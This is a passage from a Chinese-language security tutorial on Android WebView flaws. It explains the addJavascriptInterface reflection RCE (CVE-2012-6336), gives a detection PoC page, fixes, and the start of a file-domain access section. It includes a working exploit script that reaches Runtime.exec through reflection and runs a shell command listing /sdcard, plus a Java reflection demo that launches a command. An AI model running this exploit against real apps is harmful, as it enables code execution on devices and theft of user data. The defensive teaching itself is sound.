punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>而在 Android API 16 以及之前的版本，Webview 组件存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用 <code>WebView.addJavascriptInterface</code> 方法，远程攻击者可通过使用 Java Reflection API 利用该漏洞执行任意 Java 对象的方法，包括系统类（<code>java.lang.Runtime</code> 类），从而进行任意代码执行，如可以执行命令获取本地设备的 SD 卡中的文件等信息从而造成信息泄露。</p><p>【注意】WebView 任意代码执行漏洞有三种触发点<br>| 触发点                                                       | CVE编号       | 影响范围                        |<br>| ———————————————————— | ————- | ——————————- |<br>| WebView 中 addJavascriptInterface 接口                       | CVE-2012-6336 | Android &lt;= 4.1.2 (API level 16) |<br>| WebView 内置导出的 searchBoxJavaBridge_对象                  | CVE-2014-1939 | Android &lt;= 4.3.1                |<br>| WebView 内置导出的 accessibility 和 accessibilityTraversalObject 对象 | CVE-2014-7224 | Android &lt; 4.4                   |</p><p>本文只讨论第一种—— addJavascriptInterface 接口，简单的说就是通过 addJavascriptInterface 给 WebView 加入一个 JavaScript 桥接接口，JavaScript 通过调用这个接口在低版本的 Android 上可以直接无限制地随意操作本地的 JAVA 接口。</p><p><strong>漏洞触发前提</strong></p><ol><li>使用 addJavascriptInterface 方法注册可供 JavaScript 调用的 Java 对象；</li><li>使用 WebView 加载外部网页或者本地网页；</li><li>Android 系统版本低于 4.2（Android API level 小于17）。</li></ol><p><strong>获取系统类的大致流程</strong>：</p><ol><li>Android 中的对象有一公共的方法：getClass() ；</li><li>该方法可以获取到当前类的类型 Class；</li><li>该类有一关键的方法： Class.forName；</li><li>该方法可以加载一个类（可加载 java.lang.Runtime 类）；</li><li>而该类是可以执行本地命令的。</li></ol><h2 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a>JAVA反射机制</h2><p>JAVA 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为 Java 语言的反射机制。</p><p>反射，从这个“反”字可以看出与我们平时正常的使用逻辑肯定不一样，那么到底什么地方不一样了？想要了解“反”，就得先了解一下“正”的概念。在正常情况下，如果要使用一个类，必须要经过以下几个步骤：</p><ol><li>使用 import 导入类所在的包（类：java.lang.Class）；</li><li>通过关键字 new 进行类对象实例化（构造方法:java.lang.reflect.Constructor）；</li><li>产生对象可以使用“对象.属性”进行类中属性的调用(属性：java.lang.reflect.Field)；</li><li>通过“对象.方法()”调用类中的方法（方法：java.lang.reflect.Method）。</li></ol><p>括号中的补充字体对应的是每个步骤对应反射中使用到的类，在反射中使用一个类并不需要导入类的所在包，只要知道类的完整路径就可以知道该类中的所有信息。关于 Java 反射机制的理解，请参见 <a href="https://blog.csdn.net/weixin_39190897/article/details/91956959">Java-反射机制</a>，本文也不展开。</p><p>直接来看一个简单的 Java 反射 Demo：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Tr0e</span><span class="token punctuation">.</span>test<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectInvokeDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//获取Student类的Class对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.Tr0e.test.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class = "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//反射获取Student类的函数数组</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token operator">:</span>methods<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method = "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 实例化对象</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//调用Student类的私有函数setName()方法，相当于Student对象.setName("Tr0e");</span>        methods<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methods<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"Tr0e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//调用getName()方法并输出</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,"</span> <span class="token operator">+</span> methods<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>程序运行结果如下所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/5162912c892d465e89d81c52a1b30db6.png" alt="在这里插入图片描述" loading="lazy"><br>Next，来看看如何借助上面的 Java 反射实现命令执行：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectInvokeDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//获取Student类的Class对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.Tr0e.test.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class = "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//反射获取Student类的函数数组</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token operator">:</span>methods<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method = "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//第一个参数为类的实例，第二个参数为相应函数中的参数</span>            <span class="token class-name">Object</span> obj <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span> c2 <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> array <span class="token operator">=</span> <span class="token string">"cmd.exe /k start calc"</span><span class="token punctuation">;</span>            <span class="token comment">//获得该类中名称为exec，参数类型为String的方法</span>            <span class="token class-name">Method</span> n <span class="token operator">=</span> c2<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> array<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//调用方法n</span>            n<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>array<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>程序运行结果，可以看到成功借助反射机制执行命令运行了本地计算器：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/00a32e1cb3764d98be25a08ad89b91ba.png" alt="在这里插入图片描述" loading="lazy"><br>有了以上的基础，我们知道，拿到 JAVA 对象之后，可以获取类对象，然后通过反射调用任意对象的任意方法。而在我们前面的 WebView 漏洞代码中，由于访问的页面是不可控的，所以在访问危险页面时，如果页面中的 js包含危险调用，如：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> execute<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    //jsObject是导出的Object    <span class="token builtin class-name">return</span> window.jsObject.getClass<span class="token punctuation">(</span><span class="token punctuation">)</span>.forName<span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span>.getMethod<span class="token punctuation">(</span><span class="token string">"getRuntime"</span>,null<span class="token punctuation">)</span>.invoke<span class="token punctuation">(</span>null,null<span class="token punctuation">)</span>.exec<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在 JS 中获得了 Webview 中导出的 Object，只要通过上述代码就可以进行反射并 RCE。早期的 Android 版本没有对可以访问的方法作限制，这就是该漏洞的根本成因。</p><h2 id="历史漏洞POC"><a href="#历史漏洞POC" class="headerlink" title="历史漏洞POC"></a>历史漏洞POC</h2><p>在检测某个 apk 是否包含此漏洞时，我们只需要让它访问一个页面，该页面中的 js 遍历其 windows 对象然后判定 getClass 函数是否存在即可。</p><p>POC 示例代码如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>WebView漏洞检测--捉虫猎手<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>提示：如何检测出“accessibility”和 “accessibilityTraversal”接口----设置-辅助功能-开启系统或第三方辅助服务<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>red</span><span class="token punctuation">></span></span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//遍历window对象,的是为了找到包含getClass()的对象</span>    <span class="token comment">//因为Android映射的JS对象也在window中，所以肯定会遍历到</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> obj <span class="token keyword">in</span> window<span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"getClass"</span> <span class="token keyword">in</span> window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                    window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;span style="color:red">'</span><span class="token operator">+</span>obj<span class="token operator">+</span><span class="token string">'&lt;/span>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;br />'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>效果如下：<br><img src="https://img-blog.csdnimg.cn/c19b060b877747d38624be1e429681ef.png" alt="在这里插入图片描述" loading="lazy"><br>进一步的 EXP 程序（执行命令）：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>   <span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">getContents</span><span class="token punctuation">(</span><span class="token parameter">inputStream</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> contents <span class="token operator">=</span> <span class="token string">""</span><span class="token operator">+</span>i<span class="token punctuation">;</span>      <span class="token keyword">var</span> b <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> bString <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>          contents <span class="token operator">+=</span> bString<span class="token punctuation">;</span>          contents <span class="token operator">+=</span> <span class="token string">"\n"</span>          b <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> contents<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>         <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token parameter">cmdArgs</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> obj <span class="token keyword">in</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"getClass"</span> <span class="token keyword">in</span> window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token function">alert</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmdArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span>           <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/system/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"ls -al /sdcard"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">getContents</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>让 app 访问该页面，结果如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b94aa34959d7436c8582411235f930fb.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p><strong>1、使用 API Level 高于 16 的 Android 系统</strong></p><p>出于安全考虑，为了防止 Java 层的函数被随便调用，Google 在 4.2 版本之后，规定允许被调用的函数必须以 <code>@JavascriptInterface</code> 进行注解，所以如果某应用依赖的 API Level 为 17 或者以上，就不会受该问题的影响（注： Android 4.2 中 API Level 小于 17 的应用也会受影响。Google 官方文档使用示例如下:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">JsObject</span> <span class="token punctuation">&#123;</span>   <span class="token annotation punctuation">@JavascriptInterface</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">"injectedObject"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">JsObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"injectedObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"javascript:alert(injectedObject.toString())"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>【Question】 既然 API Level 高于 16 的 Android 系统上已限制了 Java 层函数的调用，那是否可以随意给 Java 层函数添加 <code>@JavascriptInterface</code> ？</p><p>答案那自然是不行的……从第一部分的 Webview 示例代码中已经可以看出，如果 Webview 对外导出且加载从外部传递进来的 URL，攻击者完全可以传递恶意的 HTML 页面来调用受害者 App 供 JS 调用的 Java 接口函数（添加了<code>@JavascriptInterface</code> 注解的函数），如果这部分函数包含敏感功能、数据，那么就相当于开闸放水了……</p><p><strong>2、 API Level 小于 17 的 Android 系统</strong></p><p>建议不要使用 <code>addJavascriptInterface</code> 接口，以免带来不必要的安全隐患，如果一定要使用 addJavascriptInterface 接口:</p><ul><li>如果使用 HTTPS 协议加载 URL，应进行证书校验防止访问的页面被篡改挂马；</li><li>如果使用 HTTP 协议加载 URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；</li><li>如果加载本地 Html，应将 html 文件内置在 APK 中，以及进行对 html 页面完整性的校验。</li></ul><h1 id="跨域访问漏洞"><a href="#跨域访问漏洞" class="headerlink" title="跨域访问漏洞"></a>跨域访问漏洞</h1><p>2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)。</p><p>漏洞产生的原因是在 Android 应用中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。</p><p><strong>漏洞触发前提</strong></p><ol><li>WebView 中 <code>setAllowFileAccessFromFileURLs</code> 或 <code>setAllowUniversalAccessFromFileURLsAPI</code> 配置为 true（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false)；</li><li>WebView 可以直接被外部调用，并能够加载外部可控的 HTML 文件。</li></ol><p><strong>漏洞影响范围</strong></p><p>漏洞影响使用 WebView 控件，开启 file 域访问并且未按安全策略开发的 Android 应用APP。CNVD 对相关漏洞综合评级为“高危”。</p><p><strong>漏洞相关函数</strong></p><p>WebView 中 getSettings 类的以下几个方法会对 WebView 安全性产生影响：<br>| 方法                                       | 作用/风险                                                    | 默认策略                  |<br>| —————————————— | ———————————————————— | ————————- |<br>| setAllowFileAccess(true);                  | 设置是否允许 WebView 使用 File 协议                          | 默认设置为 true           |<br>| setAllowFileAccessFromFileURLs(true);      | 设置是否允许通过 file url 加载的 Js 代码读取其他的本地文件   | 在 Android 4.1 后默认禁止 |<br>| setAllowUniversalAccessFromFileURLs(true); | 设置是否允许通过 file url 加载的 Javascript 可以访问其他的源 (包括http、https等源) | 在 Android 4.1 后默认禁止 |<br>| setJavaScriptEnabled(true);                | 设置是否允许 WebView 使用 JavaScript                         | 默认不允许                |</p><h2 id="File-协议风险"><a href="#File-协议风险" class="headerlink" title="File 协议风险"></a>File 协议风险</h2><p>来看看设置  setAllowFileAccess(true) 存在的风险。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> TAG <span class="token operator">=</span> <span class="token string">"WebviewTestActivity"</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token 